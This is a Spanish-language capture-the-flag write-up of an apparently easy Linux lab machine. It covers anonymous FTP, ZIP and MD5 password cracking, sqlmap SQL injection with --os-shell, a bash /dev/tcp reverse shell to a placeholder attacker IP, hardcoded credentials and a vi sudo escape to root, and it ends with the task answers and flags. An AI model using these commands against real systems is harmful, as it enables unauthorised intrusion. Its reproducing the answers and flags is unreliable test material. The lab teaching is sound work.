
> **Dificultad:** Starting Point — Easy **SO:** Linux **Técnicas:** FTP Anonymous, ZIP cracking, SQL Injection, sqlmap, Privilege Escalation con vi

---

## Reconocimiento

Todo pentesting empieza por el reconocimiento. Primero verificamos que la máquina está activa con un ping, y luego lanzamos nmap para descubrir qué puertos y servicios están expuestos.

```bash
ping -c 1 10.129.72.4
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 10.129.72.4 -oN nmap/escaneo
```

**¿Qué hace cada flag de nmap?**

- `-p-` → escanea los 65535 puertos
- `--open` → solo muestra puertos abiertos
- `--min-rate 5000` → envía mínimo 5000 paquetes por segundo (escaneo rápido)
- `-A` → activa detección de OS, versiones, scripts y traceroute
- `-sS` → SYN scan (sigiloso, no completa el handshake TCP)
- `-Pn` → no hace ping previo, trata el host como activo
- `-n` → no resuelve DNS (más rápido)
- `-oN` → guarda el output en formato normal

El escaneo revela tres puertos abiertos: **21 (FTP)**, **22 (SSH)** y **80 (HTTP)**.

![[Pasted image 20260411214401.png]]

---

## Task 1 — ¿Qué otro servicio está corriendo además de SSH y HTTP?

El puerto **21** corresponde al protocolo **FTP** (File Transfer Protocol), usado para transferencia de archivos entre sistemas. Lo interesante es que nmap detecta que permite **login anónimo**, lo que significa que podemos entrar sin credenciales válidas.

![[Pasted image 20260411214313.png]]

**Respuesta: `FTP`**

---

## Task 2 — ¿Qué usuario permite login con cualquier contraseña?

FTP tiene una configuración especial que muchos administradores habilitan por comodidad: el usuario **anonymous**. Al usarlo, el servidor acepta cualquier valor como contraseña (normalmente se usa un email ficticio o simplemente se deja vacío). Es una mala práctica de seguridad que en CTFs y entornos reales expone archivos sensibles.

**Respuesta: `anonymous`**

---

## Task 3 — ¿Qué archivo se descarga a través de FTP?

Nos conectamos al servidor FTP usando el usuario anonymous:

```bash
ftp 10.129.72.4
# Usuario: anonymous
# Contraseña: (vacío o cualquier cosa)
```

Una vez dentro, listamos el contenido con `ls`:

```
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```

![[Pasted image 20260411214523.png]]

Hay un archivo `backup.zip`. Como la conexión FTP dentro de la sesión interactiva puede dar problemas, lo descargamos directamente con wget desde fuera:

```bash
wget ftp://10.129.72.4/backup.zip
```

Los archivos de backup en entornos web suelen contener código fuente, configuraciones o credenciales. Son un objetivo muy valioso.

**Respuesta: `backup.zip`**

---

## Task 4 — ¿Qué script de John The Ripper genera un hash desde un ZIP protegido?

Al intentar descomprimir el archivo, vemos que está protegido con contraseña:

```bash
unzip backup.zip
# Archive: backup.zip [backup.zip] index.php password:
```

John The Ripper no puede crackear directamente un ZIP, necesita que el archivo se convierta a un formato de hash que él entienda. Para eso existe **zip2john**, una utilidad incluida en la suite de John que extrae el hash criptográfico del ZIP.

**Respuesta: `zip2john`**

---

## Task 5 — ¿Cuál es la contraseña del usuario admin en la web?

### Paso 1: Extraer el hash del ZIP

```bash
zip2john backup.zip > hashbackup.txt
```

zip2john analiza el ZIP cifrado y genera un hash en un formato que John puede procesar. También nos avisa de que asume que todos los archivos dentro tienen la misma contraseña.

### Paso 2: Crackear el hash con rockyou

```bash
john hashbackup.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

`rockyou.txt` es el diccionario de contraseñas más famoso en hacking, con millones de contraseñas reales filtradas de brechas de datos. John compara el hash del ZIP contra cada entrada hasta encontrar coincidencia.

![[Pasted image 20260411220354.png]]

La contraseña del ZIP es: **741852963**

### Paso 3: Extraer y analizar el contenido

```bash
unzip backup.zip
cat index.php
```

Dentro de `index.php` encontramos el código fuente de la página de login. Ahí vemos una comparación de contraseña con un hash MD5:

```php
// hash MD5 de la contraseña del admin
2cb42f8734ea607eefed3b70af13bbd3
```

![[Pasted image 20260411220517.png]]

MD5 es un algoritmo de hashing considerado **inseguro** hoy en día. Existen enormes bases de datos de hashes MD5 conocidos. Usamos CrackStation, una web que busca en esas bases de datos:

![[Pasted image 20260411220737.png]]

El hash corresponde a: **qwerty789**

**Respuesta: `qwerty789`**

### Paso 4: Login en la web

Con las credenciales `admin:qwerty789` accedemos al panel en `/dashboard.php`:

![[Pasted image 20260411220831.png]]

---

## Task 6 — ¿Qué opción de sqlmap permite intentar conseguir ejecución de comandos?

### Identificando el vector de ataque

En el dashboard encontramos un buscador de coches. La URL tiene el parámetro `?search=`, que es un candidato clásico para **SQL Injection**: si el servidor no sanitiza correctamente el input del usuario, podemos manipular la consulta SQL que se ejecuta en la base de datos.

En lugar de testear manualmente, usamos **sqlmap**, una herramienta automatizada de detección y explotación de SQL Injection.

### Paso 1: Confirmar la vulnerabilidad

Primero necesitamos nuestra cookie de sesión activa (la obtenemos desde el navegador con una extensión como Cookie-Editor):

```bash
sqlmap -u 'http://10.129.72.4/dashboard.php?search=any+query' \
  --cookie="PHPSESSID=vnhvg6bth9ahhhjdn03h3dsjq6"
```

sqlmap prueba múltiples técnicas de inyección de forma automática. El resultado confirma que el parámetro `search` es vulnerable:

![[Pasted image 20260411221856.png]]

### Paso 2: Obtener ejecución de comandos con --os-shell

```bash
sqlmap -u 'http://10.129.72.4/dashboard.php?search=any+query' \
  --cookie="PHPSESSID=vnhvg6bth9ahhhjdn03h3dsjq6" --os-shell
```

La opción `--os-shell` le dice a sqlmap que intente aprovechar la inyección SQL para ejecutar comandos del sistema operativo. En bases de datos como PostgreSQL, esto es posible a través de funciones especiales que permiten leer/escribir archivos o ejecutar comandos externos.

![[Pasted image 20260411222025.png]]

**Respuesta: `--os-shell`**

---

## Obteniendo la shell — User Flag

El `os-shell` de sqlmap funciona, pero es inestable. Lo mejor es usarlo para lanzar una **reverse shell** real hacia nuestra máquina.

### Paso 1: Ponerse en escucha

En nuestra máquina atacante:

```bash
sudo nc -lvnp 443
```

`nc` (netcat) actúa como servidor esperando conexiones entrantes en el puerto 443. Usamos 443 porque es el puerto de HTTPS y suele estar permitido en firewalls.

### Paso 2: Lanzar la reverse shell

Desde el os-shell de sqlmap ejecutamos:

```bash
bash -c "bash -i >& /dev/tcp/TU_IP/443 0>&1"
```

Este comando hace que el servidor víctima abra una conexión TCP hacia nuestra IP, redirigiendo su bash interactivo a través de esa conexión. Básicamente, la shell del servidor "llama de vuelta" a nuestra máquina.

![[Pasted image 20260411222249.png]]

```bash
whoami
# postgres
```

Somos el usuario **postgres**, el usuario del sistema que corre la base de datos. Buscamos la flag de usuario:

![[Pasted image 20260411222238.png]]

**User flag: `ec9b13ca4d6229cd5cc1e09980965bf7`**

---

## Escalada de privilegios — Root Flag

Tenemos acceso como `postgres` pero necesitamos ser `root`. El proceso de conseguir más privilegios se llama **Privilege Escalation**.

### Paso 1: Buscar credenciales en el código fuente

Una técnica clásica es revisar los archivos de configuración de la web. Vamos a `/var/www/html/` y leemos `dashboard.php`:

![[Pasted image 20260411222955.png]]

![[Pasted image 20260411223122.png]]

Encontramos las credenciales de conexión a la base de datos hardcodeadas en el código:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Esto es una mala práctica muy común: guardar contraseñas directamente en el código fuente. La contraseña es **P@s5w0rd!**

### Paso 2: Conectarse por SSH para una sesión estable

```bash
ssh postgres@10.129.72.4
# Password: P@s5w0rd!
```

Tener una sesión SSH es mucho más cómoda y estable que la reverse shell.

---

## Task 7 — ¿Qué programa puede ejecutar postgres como root con sudo?

`sudo -l` es el comando que muestra qué comandos puede ejecutar el usuario actual con privilegios elevados:

```bash
sudo -l
```

![[Pasted image 20260411223451.png]]

```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

El usuario `postgres` puede ejecutar **vi** como root, pero solo para editar ese archivo concreto. En principio parece inofensivo, pero los editores de texto como vi tienen funcionalidades para ejecutar comandos del sistema, lo que lo convierte en un vector de escalada.

**Respuesta: `vi`**

---

### Explotando vi para escalar a root

**GTFOBins** es una base de datos de técnicas para abusar de binarios Unix legítimos con el fin de escalar privilegios, escapar de restricciones o ejecutar comandos. Para vi, la técnica es la siguiente:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Se abre vi con privilegios de root. Ahora, dentro del editor, ejecutamos los siguientes comandos en modo comando de vi (presionando `Esc` primero si fuera necesario):

```vim
:set shell=/bin/sh
:shell
```

**¿Qué hace esto?**

- `:set shell=/bin/sh` → le dice a vi que use `/bin/sh` como shell para ejecutar comandos
- `:shell` → lanza esa shell desde dentro de vi

Como vi está corriendo como root, la shell que lanza también tiene privilegios de root.

![[Pasted image 20260411223936.png]]

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

![[Pasted image 20260411224803.png]]

¡Somos root! Navegamos al directorio `/root` y obtenemos la flag final:

```bash
cd /root
bash
cat root.txt
```

![[Pasted image 20260411224912.png]]

![[Pasted image 20260411224953.png]]

**Root flag: `dd6e058e814260bc70e9bbdef2715849`**

---

## Resumen de la máquina

Esta máquina encadena varias técnicas muy comunes en entornos reales:

1. **FTP anónimo** → descarga de archivo de backup con información sensible
2. **Password cracking** → zip2john + John The Ripper + rockyou.txt
3. **Hash cracking** → MD5 en CrackStation
4. **SQL Injection** → sqlmap con --os-shell para RCE
5. **Reverse shell** → establecer conexión estable hacia nuestra máquina
6. **Credenciales en código fuente** → contraseña hardcodeada en PHP
7. **Sudo misconfiguration** → abuso de vi con GTFOBins para escalar a root

|Task|Respuesta|
|---|---|
|Servicio adicional|FTP|
|Usuario login anónimo|anonymous|
|Archivo descargado|backup.zip|
|Script de John The Ripper|zip2john|
|Contraseña admin web|qwerty789|
|Opción sqlmap para RCE|--os-shell|
|Programa sudo de postgres|vi|
|**User flag**|ec9b13ca4d6229cd5cc1e09980965bf7|
|**Root flag**|dd6e058e814260bc70e9bbdef2715849|